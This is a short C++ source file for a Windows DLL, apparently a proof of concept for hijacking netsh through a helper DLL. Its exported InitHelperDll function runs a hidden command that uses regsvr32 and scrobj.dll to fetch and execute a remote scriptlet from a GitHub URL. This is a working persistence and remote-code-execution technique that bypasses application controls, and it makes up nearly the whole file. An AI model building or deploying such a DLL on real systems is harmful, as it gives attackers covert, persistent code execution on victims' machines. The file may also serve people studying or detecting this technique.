// netshtest.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "netshtest.h"

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
    }
    return TRUE;
}

DWORD WINAPI InitHelperDll(DWORD dwNetshVersion,PVOID pReserved)
{
	char *command="cmd.exe /c start regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll";
    WinExec(command,SW_HIDE); 
//	MessageBox(0, "netsh hijack", "test", MB_OK);
	return 0;
}

